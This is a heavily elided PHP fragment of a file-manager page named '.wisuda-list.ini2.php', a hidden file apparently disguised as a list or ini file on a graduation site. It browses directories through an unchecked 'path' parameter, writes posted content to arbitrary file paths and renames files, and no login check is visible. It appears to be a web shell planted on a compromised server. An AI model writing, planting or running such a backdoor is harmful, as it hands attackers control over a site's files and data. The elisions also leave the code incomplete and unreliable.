...
function showDirectory($path) {
    ...
    foreach ($dirs as $dir) {
        echo "<tr>";
        echo "<td><a href='.wisuda-list.ini2.php?path=$path/$dir'>$dir/</a></td>";
...
if (isset($_POST['file_content'])) {
    ...
    header("Location: .wisuda-list.ini2.php?path=" . dirname($_POST['file_path']));
    exit();
}
if (isset($_POST['new_name'])) {
    ...
    header("Location: .wisuda-list.ini2.php?path=" . dirname($old_name));
    exit();
}
...
<body>
    ...
    <h2>Current Path: 
        ...
        foreach ($paths as $dir) {
            $link .= $dir . '/';
            echo " / <a href='.wisuda-list.ini2.php?path=" . urlencode($link) . "'>$dir</a>";
        }
        ?>
    </h2>
